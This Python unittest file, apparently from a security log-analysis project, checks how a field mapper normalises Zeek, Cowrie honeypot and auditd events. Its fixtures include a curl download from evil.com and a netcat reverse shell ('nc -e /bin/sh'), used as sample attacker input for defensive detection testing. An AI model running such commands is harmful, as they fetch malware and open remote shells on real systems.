# tests/test_field_mapper_coverage.py
import unittest
import sys
import os

# 添加项目根目录到路径
sys.path.append(os.getcwd())

class TestFieldMapperCoverage(unittest.TestCase):

    def setUp(self):
        print(f"\n🔍 [FieldMapper] 覆盖率测试: {self._testMethodName}")
        try:
            from analyzer.attack_analyzer.field_mapper import FieldMapper, EventNormalizer
            self.mapper = FieldMapper()
            self.normalizer = EventNormalizer()
        except ImportError:
            self.fail("无法导入 FieldMapper 或 EventNormalizer")

    # =========================================================
    # 1. 测试组员2 - Zeek Network Flow (Conn)
    # =========================================================
    def test_zeek_conn_mapping(self):
        """验证 Zeek 流量日志字段映射"""
        # 模拟 Zeek conn.log
        zeek_event = {
            "event": {"dataset": "zeek.conn", "category": "network"},
            "source": {"ip": "192.168.1.5", "port": 12345},
            "destination": {"ip": "10.0.0.1", "port": 80},
            "network": {"transport": "tcp", "protocol": "http"},
            "raw": {
                "id.orig_h": "192.168.1.5",
                "id.resp_h": "10.0.0.1",
                "proto": "tcp"
            }
        }
        
        # 执行标准化和映射
        logsource = self.normalizer.get_logsource_type(zeek_event)
        mapped = self.mapper.map_event(zeek_event, logsource)
        
        print(f"   [Zeek] LogSource Identified: {logsource}")
        print(f"   [Zeek] Mapped Fields: {mapped}")
        
        # 验证关键字段是否映射到了 Sigma 标准字段
        self.assertEqual(logsource['product'], 'zeek', "LogSource Product 识别错误")
        self.assertEqual(mapped['id.orig_h'], "192.168.1.5", "源 IP 映射失败")
        self.assertEqual(mapped['id.resp_p'], 80, "目标端口映射失败")
        self.assertEqual(mapped['proto'], "tcp", "协议映射失败")
        print("   ✅ Zeek Conn 映射验证通过")

    # =========================================================
    # 2. 测试组员2 - Cowrie Honeypot (Command)
    # =========================================================
    def test_cowrie_command_mapping(self):
        """验证蜜罐命令执行日志映射 (关键修复验证)"""
        # 模拟 Cowrie 命令日志
        cowrie_event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "curl http://evil.com/mal"},
            "raw": {
                "eventid": "cowrie.command.input", # 关键字段
                "session": "a1b2c3d4",            # 关键字段
                "input": "curl http://evil.com/mal",
                "src_ip": "59.64.129.102"
            }
        }
        
        logsource = self.normalizer.get_logsource_type(cowrie_event)
        mapped = self.mapper.map_event(cowrie_event, logsource)
        
        print(f"   [Cowrie] LogSource Identified: {logsource}")
        print(f"   [Cowrie] Mapped Fields: {mapped}")
        
        # 验证是否针对 Cowrie 做了特殊处理
        self.assertEqual(logsource['product'], 'cowrie', "蜜罐 Product 识别错误")
        self.assertEqual(mapped['CommandLine'], "curl http://evil.com/mal", "命令行映射失败")
        self.assertEqual(mapped['eventid'], "cowrie.command.input", "EventID 映射失败 (影响规则匹配)")
        self.assertEqual(mapped['session'], "a1b2c3d4", "Session 映射失败 (影响图谱关联)")
        self.assertEqual(mapped['src_ip'], "59.64.129.102", "攻击源 IP 映射失败")
        print("   ✅ Cowrie Command 映射验证通过")

    # =========================================================
    # 3. 测试组员1 - Linux Auditd (Fallback Logic)
    # =========================================================
    def test_auditd_fallback_mapping(self):
        """验证 Auditd 在缺失标准字段时的兜底逻辑"""
        # 模拟一个稍微残缺的 Auditd 日志 (process.command_line 丢失，但 raw.data 存在)
        auditd_event = {
            "event": {"dataset": "auditd", "category": "process"},
            "process": {
                "name": "netcat",
                # "command_line": ""  <-- 模拟缺失
            },
            "raw": {
                "type": "EXECVE",
                "data": "nc -e /bin/sh 1.2.3.4" # 应该从这里恢复
            }
        }
        
        logsource = self.normalizer.get_logsource_type(auditd_event)
        mapped = self.mapper.map_event(auditd_event, logsource)
        
        print(f"   [Auditd] Mapped Fields: {mapped}")
        
        # 验证是否触发了兜底逻辑
        self.assertIn("CommandLine", mapped, "未能从 raw.data 恢复 CommandLine")
        self.assertEqual(mapped['CommandLine'], "nc -e /bin/sh 1.2.3.4")
        self.assertEqual(mapped['Image'], "netcat", "Image 字段映射错误")
        print("   ✅ Auditd 兜底逻辑验证通过")

if __name__ == '__main__':
    unittest.main()
